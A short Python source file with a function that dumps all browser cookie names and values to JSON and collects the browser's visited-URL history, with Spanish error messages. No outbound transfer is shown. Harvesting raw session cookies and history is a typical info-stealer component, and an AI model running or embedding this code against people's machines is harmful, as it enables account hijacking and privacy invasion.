import json
def getBrowsersInfo(browserCookie, browserHistory):
    
    try:
        cookies = json.dumps({cookie.name: cookie.value for cookie in browserCookie()}, indent=4)
    except:
        try:
            print(f"No se pudo obtener las cookies de {browserHistory().name}")
        except:
            pass
        cookies = None
        
        
        
    try:
        history = [{'datetime': str(entry[0]), 'url': entry[1]} for entry in browserHistory().fetch_history().histories]
    except:
        try:
            print(f"No se pudo obtener el historial de {browserHistory().name}")
        except:
            pass
        history = None
        
    return [cookies, history]


